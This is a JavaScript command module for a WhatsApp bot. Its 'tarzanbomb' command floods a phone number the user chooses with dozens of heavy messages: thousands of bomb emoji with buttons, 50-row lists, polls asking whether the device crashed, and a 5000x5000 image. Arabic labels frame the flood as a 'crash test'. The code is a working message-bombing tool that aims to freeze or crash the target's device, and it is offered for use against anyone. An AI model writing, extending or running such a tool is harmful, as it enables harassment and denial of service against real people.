// commands/tarzanbomb.js

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("tarzanbomb")) return;

  const parts = text.trim().split(/\s+/);
  const number = parts[1];
  const count = parseInt(parts[2]) || 50;

  if (!number || isNaN(number)) {
    return reply("❌ يرجى كتابة رقم الهاتف بعد الأمر.\nمثال: tarzanbomb 966xxxxxxxx 50");
  }

  const jid = `${number}@s.whatsapp.net`;
  const delay = (ms) => new Promise((res) => setTimeout(res, ms));

  const bigText = "💣".repeat(1000) + "\n🧨".repeat(1000);

  const buttons = [
    { buttonId: '💣1', buttonText: { displayText: '💥 تفجير' }, type: 1 },
    { buttonId: '💣2', buttonText: { displayText: '🔥 حريق' }, type: 1 },
    { buttonId: '💣3', buttonText: { displayText: '🚫 تجميد' }, type: 1 },
    { buttonId: '💣4', buttonText: { displayText: '💀 انهيار' }, type: 1 },
    { buttonId: '💣5', buttonText: { displayText: '🧨 نسف' }, type: 1 },
  ];

  try {
    await reply(`🚀 بدأ اختبار الانفجار على ${number} بـ ${count} رسالة متنوعة...`);

    for (let i = 0; i < count; i++) {
      const type = i % 4;

      if (type === 0) {
        await sock.sendMessage(jid, {
          text: bigText,
          buttons: buttons,
          headerType: 1
        });
      } else if (type === 1) {
        await sock.sendMessage(jid, {
          text: "💥 اختبار القوائم الثقيلة",
          title: "قائمة وهمية",
          buttonText: "عرض القائمة",
          sections: [
            {
              title: "قسم 1",
              rows: Array(50).fill().map((_, i) => ({
                title: `🧨 عنصر ${i + 1}`,
                rowId: `row${i + 1}`
              })),
            },
          ],
        });
      } else if (type === 2) {
        await sock.sendMessage(jid, {
          poll: {
            name: '🚨 هل تعطل جهازك؟',
            values: ['نعم', 'لا', 'انهار'],
            selectableCount: 1
          }
        });
      } else {
        await sock.sendMessage(jid, {
          image: { url: "https://via.placeholder.com/5000x5000.jpg" },
          caption: "📷 صورة اختبار انهيار"
        });
      }

      await delay(300); // تأخير بسيط بين كل رسالة
    }

    await reply(`✅ تم الانتهاء من إرسال ${count} رسالة اختبار بنجاح!`);
  } catch (err) {
    console.error(err);
    await reply(`❌ فشل أثناء الإرسال إلى: ${number}`);
  }
};
